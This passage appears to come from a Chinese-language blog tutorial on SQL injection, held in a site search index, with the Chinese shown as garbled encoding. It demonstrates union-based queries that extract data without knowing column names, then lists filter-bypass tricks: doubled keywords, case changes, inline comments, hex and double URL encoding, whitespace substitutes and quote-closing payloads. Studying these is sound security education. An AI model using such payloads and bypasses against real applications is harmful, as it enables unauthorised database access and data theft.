class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users</span><br></pre></td></tr></table></figure><p>æŠŠåˆ—åå˜æˆäº†1ã€2ã€3ã€4</p><img src="/2024/11/11/sql%E6%B3%A8%E5%85%A5/3023974-20240221130236046-1701495395.png" class="" title="image-20240221130237890"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> `<span class="number">2</span>` <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a</span><br><span class="line"><span class="keyword">select</span> a<span class="number">.2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)a</span><br><span class="line">#è®°å¾—ç¬¬ä¸€ä¸ª<span class="number">2</span>åŠ åå¼•å·,æˆ–è€…ä½¿ç”¨a<span class="number">.2</span></span><br></pre></td></tr></table></figure><p>å³ä»å·¦å‘å³è¿›è¡ŒæŸ¥è¯¢è·å–æ‰€éœ€çš„ä¿¡æ¯</p><img src="/2024/11/11/sql%E6%B3%A8%E5%85%A5/3023974-20240221130553045-291843630.png" class="" title="image-20240221130554759"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(`<span class="number">3</span>`) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>)x;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(x<span class="number">.3</span>) <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)x;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(x.c) <span class="keyword">from</span> (<span class="keyword">select</span> (<span class="keyword">select</span> <span class="number">1</span>)a,(<span class="keyword">select</span> <span class="number">2</span>)b,(<span class="keyword">select</span> <span class="number">3</span>)c <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users)x;</span><br></pre></td></tr></table></figure></li></ul><h3 id="SQLæ³¨å…¥ç»•è¿‡"><a href="#SQLæ³¨å…¥ç»•è¿‡" class="headerlink" title="SQLæ³¨å…¥ç»•è¿‡"></a>SQLæ³¨å…¥ç»•è¿‡</h3><h4 id="1-æ³¨é‡Šå­—ç¬¦ç»•è¿‡"><a href="#1-æ³¨é‡Šå­—ç¬¦ç»•è¿‡" class="headerlink" title="1.æ³¨é‡Šå­—ç¬¦ç»•è¿‡"></a><strong>1.æ³¨é‡Šå­—ç¬¦ç»•è¿‡</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- æ³¨é‡Šå†…å®¹</span><br><span class="line"># æ³¨é‡Šå†…å®¹      urlç¼–ç ä¸º%23</span><br><span class="line">/*æ³¨é‡Šå†…å®¹*/</span><br><span class="line">;</span><br><span class="line">/x00</span><br></pre></td></tr></table></figure><h4 id="2-åŒå†™ç»•è¿‡"><a href="#2-åŒå†™ç»•è¿‡" class="headerlink" title="2.åŒå†™ç»•è¿‡"></a><strong>2.åŒå†™ç»•è¿‡</strong></h4><p>ç»•è¿‡åœºæ™¯ï¼šä»£ç ä½¿ç”¨replaceå°†å­—ç¬¦ä»£æ›¿ä¸ºç©ºæ—¶ä½¿ç”¨</p><p>ä¾‹å¦‚ï¼Œè¿‡æ»¤äº†select</p><p>ä½¿ç”¨<code>selselectect =&gt;select</code></p><h4 id="3-å¤§å†™ç»•è¿‡"><a href="#3-å¤§å†™ç»•è¿‡" class="headerlink" title="3.å¤§å†™ç»•è¿‡"></a><strong>3.å¤§å†™ç»•è¿‡</strong></h4><p>åœ¨æ­£åˆ™åŒ¹é…å¯¹å¤§å°å†™ä¸æ•æ„Ÿæ—¶ï¼Œä¹Ÿå°±æ˜¯æ­£åˆ™åŒ¹é…ä½¿ç”¨äº†<code>\i</code>ï¼Œå¿½ç•¥äº†å¤§å°å†™ã€‚è€ŒMysqlå¯¹å¤§å°å†™ä¹Ÿä¸æ•æ„Ÿæ—¶ä½¿ç”¨</p><p>ä¾‹å¦‚ï¼Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/select/i</span><br><span class="line"></span><br><span class="line">ä½¿ç”¨SeLectè¿›è¡Œç»•è¿‡</span><br></pre></td></tr></table></figure><h4 id="4-å†…è”æ³¨é‡Š"><a href="#4-å†…è”æ³¨é‡Š" class="headerlink" title="4.å†…è”æ³¨é‡Š"></a><strong>4.å†…è”æ³¨é‡Š</strong></h4><p><strong>å†…è”æ³¨é‡Šçš„ä½œç”¨æ˜¯å¢åŠ SQLè¯­å¥çš„å¯ç§»æ¤æ€§ã€‚æ¯”å¦‚ï¼Œå°†MySQLç‰¹æœ‰çš„è¯­æ³•ä½¿ç”¨å†…è”æ³¨é‡Šçš„å½¢å¼æ¥ç¼–å†™ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒMySQLå¯ä»¥æ­£å¸¸çš„è§£æå¹¶æ‰§è¡Œå†…è”æ³¨é‡Šä¸­çš„ä»£ç ï¼Œä½†æ˜¯å…¶å®ƒçš„SQLæœåŠ¡å™¨åˆ™å¿½ç•¥å†…è”æ³¨é‡Šä¸­çš„å†…å®¹ã€‚</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/*! MySQLç‰¹æœ‰çš„è¯­æ³• */</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚MySQLæœåŠ¡å™¨å¯ä»¥åœ¨ä»¥ä¸‹è¯­å¥ä¸­è¯†åˆ«<code>STRAIGHT_JOIN</code>å…³é”®å­—ï¼Œè€Œå…¶ä»–æœåŠ¡å™¨åˆ™ä¸èƒ½ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT /*! STRAIGHT_JOIN*/ col1 FROM table1,table2 WHERE ...</span><br></pre></td></tr></table></figure><p>&#x2F;*! *&#x2F;ç±»å‹çš„æ³¨é‡Šï¼Œå†…éƒ¨è¯­å¥ä¼šè¢«æ‰§è¡Œ</p><p>ä¸€èˆ¬ç”¨æ¥ç»•è¿‡ç©ºæ ¼</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select bbb from table1 where aaa=&#x27;&#x27; union /*! select database()*/;</span><br></pre></td></tr></table></figure><h4 id="5-ç‰¹æ®Šç¼–ç ç»•è¿‡"><a href="#5-ç‰¹æ®Šç¼–ç ç»•è¿‡" class="headerlink" title="5.ç‰¹æ®Šç¼–ç ç»•è¿‡"></a><strong>5.ç‰¹æ®Šç¼–ç ç»•è¿‡</strong></h4><p>16è¿›åˆ¶ç¼–ç ç»•è¿‡</p><p>å¦‚æœåœ¨æŸ¥è¯¢å­—æ®µåçš„æ—¶å€™è¡¨åè¢«è¿‡æ»¤ï¼Œæˆ–è€…æ˜¯æ•°æ®åº“ä¸­æŸäº›ç‰¹å®šå­—ç¬¦è¢«è¿‡æ»¤ï¼Œåˆ™å¯ä»¥ä½¿ç”¨16è¿›åˆ¶ç»•è¿‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=0x7573657273;</span><br></pre></td></tr></table></figure><p><code>0x7573657273</code>ä¸ºusersçš„16è¿›åˆ¶ç¼–ç </p><h4 id="6-åŒé‡urlç¼–ç ç»•è¿‡"><a href="#6-åŒé‡urlç¼–ç ç»•è¿‡" class="headerlink" title="6.åŒé‡urlç¼–ç ç»•è¿‡"></a><strong>6.åŒé‡urlç¼–ç ç»•è¿‡</strong></h4><p>å¯¹å­—ç¬¦ä¸²è¿›è¡ŒäºŒæ¬¡urlç¼–ç ï¼Œå¯ç»•è¿‡å…³é”®å­—è¿‡æ»¤</p><h4 id="7-ç©ºæ ¼ç»•è¿‡"><a href="#7-ç©ºæ ¼ç»•è¿‡" class="headerlink" title="7.ç©ºæ ¼ç»•è¿‡"></a><strong>7.ç©ºæ ¼ç»•è¿‡</strong></h4><p>å¯ä»¥ä½¿ç”¨%0d(å›è½¦)ã€%0a(æ¢è¡Œ)ã€%09(tabåˆ¶è¡¨)ã€&#x2F;**&#x2F;ã€%a0(&amp;nbspï¼‰ã€%0b(å‚ç›´åˆ¶è¡¨ç¬¦)ã€%0cï¼ˆæ¢é¡µç¬¦ï¼‰</p><h4 id="8-è¿‡æ»¤äº†-andã€orã€-ã€-ã€"><a href="#8-è¿‡æ»¤äº†-andã€orã€-ã€-ã€" class="headerlink" title="8.è¿‡æ»¤äº† andã€orã€&#x3D;ã€&gt;ã€&lt;ã€regexp"></a>8.è¿‡æ»¤äº† andã€orã€&#x3D;ã€&gt;ã€&lt;ã€regexp</h4><p>ä½¿ç”¨ &amp;&amp;ã€||ã€ likeã€greatest(è¿”å›å€¼çš„æœ€å¤§å€¼)ã€leastï¼ˆè¿”å›å€¼çš„æœ€å°å€¼ï¼‰</p><h4 id="9-è¿‡æ»¤äº†é€—å·"><a href="#9-è¿‡æ»¤äº†é€—å·" class="headerlink" title="9.è¿‡æ»¤äº†é€—å·"></a><strong>9.è¿‡æ»¤äº†é€—å·</strong></h4><p>limitä½¿ç”¨fromæˆ–è€…offset</p><p>select substr(database(0from1for1);select mid(database(0from1for1);</p><p>substrä½¿ç”¨from for</p><p>select * from news limit 0,1 &lt;&#x3D;&gt; select * from news limit 1 offset 0</p><p>ifè¯­å¥ä½¿ç”¨exp()å‡½æ•°ä»£æ›¿</p><p>exp()å‡½æ•°é™¤äº†èƒ½ç”¨åœ¨æŠ¥é”™æ³¨å…¥ä»¥å¤–ï¼Œåˆ©ç”¨expåœ¨å‚æ•°å¤§äº709æ—¶ä¼šæŠ¥é”™çš„ç‰¹æ€§å¯ä»¥ç”¨æ¥æ„é€ æ¡ä»¶åˆ¤æ–­è¯­å¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">||exp(710-(... rlike ...))</span><br></pre></td></tr></table></figure><p>å³å¦‚æœ <code>(... rlike ...)</code> ä¸­çš„è¯­å¥æ‰§è¡ŒåŒ¹é…åçš„ç»“æœä¸º<code>True</code>ï¼Œç»è¿‡å‡å·è½¬æ¢åä¸º <code>exp(710-1)</code> åä¸ä¼šæº¢å‡ºï¼›è‹¥ä¸º<code>false</code>ï¼Œè½¬æ¢ä¸º <code>exp(710-0)</code> ååˆ™ä¼šæº¢å‡ºå¹¶æŠ¥é”™</p><h4 id="10ã€ç»•è¿‡æ³¨é‡Šç¬¦å·ï¼ˆ-ï¼Œâ€“ï¼‰è¿‡æ»¤"><a href="#10ã€ç»•è¿‡æ³¨é‡Šç¬¦å·ï¼ˆ-ï¼Œâ€“ï¼‰è¿‡æ»¤" class="headerlink" title="10ã€ç»•è¿‡æ³¨é‡Šç¬¦å·ï¼ˆ#ï¼Œâ€“ï¼‰è¿‡æ»¤"></a><strong>10ã€ç»•è¿‡æ³¨é‡Šç¬¦å·ï¼ˆ#ï¼Œâ€“ï¼‰è¿‡æ»¤</strong></h4><p>ä½¿ç”¨å•å¼•å·ã€åŒå¼•å·è¿›è¡Œå¼•å·é—­åˆç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;$_POST[id]&#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¼ å…¥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 union select 1,2,3&#x27; </span><br></pre></td></tr></table></figure><p>è¿™æ ·è¯­å¥å°±å˜æˆäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;1&#x27; and 1=2 union select 1,2,3&#x27; &#x27; LIMIT 0,1</span><br></pre></td></tr></table></figure><p>å¼•å·æ­£å¸¸é—­åˆ</p><h4 id="11ã€ç»•è¿‡unionï¼Œselectï¼Œwhereç­‰"><a href="#11ã€ç»•è¿‡unionï¼Œselectï¼Œwhereç­‰" class="headerlink" title="11ã€ç»•è¿‡unionï¼Œselectï¼Œwhereç­‰"></a>11ã€ç»•è¿‡unionï¼Œselectï¼Œwhereç­‰</h4><p>å¯å°è¯•åœ¨å…³é”®å­—å†…æ’å…¥&#x2F;**&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">U/**/NION/**/SE/**/LECT/**/userï¼Œpwd from user</span><br><span class="line"></span><br><span class="line">union select user,pwd from user</span><br></pre></td></tr></table></figure><h4 id="12-ç­‰ä»·å‡½æ•°ç»•è¿‡"><a href="#12-ç­‰ä»·å‡½æ•°ç»•è¿‡" class="headerlink" title="12.ç­‰ä»·å‡½æ•°ç»•è¿‡"></a>12.ç­‰ä»·å‡½æ•°ç»•è¿‡</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hex()ã€bin() ==&gt; ascii()</span><br><span class="line">sleep() ==&gt;benchmark()</span><br><span class="line">concat_ws()==&gt;group_concat()</span><br><span class="line">mid()ã€substr() ==&gt; substring()</span><br><span class="line">@@user ==&gt; user()</span><br><span class="line">@@datadir ==&gt; datadir()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
